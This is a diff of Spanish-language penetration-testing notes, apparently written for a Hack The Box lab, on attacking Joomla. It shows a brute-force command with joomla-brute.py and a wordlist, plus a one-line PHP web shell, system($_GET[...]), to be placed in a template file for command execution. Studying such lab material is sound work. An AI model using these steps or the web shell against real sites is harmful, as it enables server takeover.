@@ -33,10 +33,12 @@ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/met
 #Bruteforce para Joomla
 
 	## Abusing: Code execution
-template > configuration > protostar
+template > configuration > <tamplate name>
 #(Ante problemas visitar modulo htb) Esto nos da la pagina de customizacion de los tamplets
 system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
-#Agregamos la shell en el template para poder ejecutar comandos
+#Agregamos la shell en alguna pagina php del template para poder ejecutar comandos
+/template/<name>/<file>.php
+#Una vez editado, es posible que la edicion quede en la pagina principal o debamos buscar la pagina directo en el template como la forma de arriba
 
 	## Abusing: Knowgn vulns
 Research en versiones de Joomla para CVS's
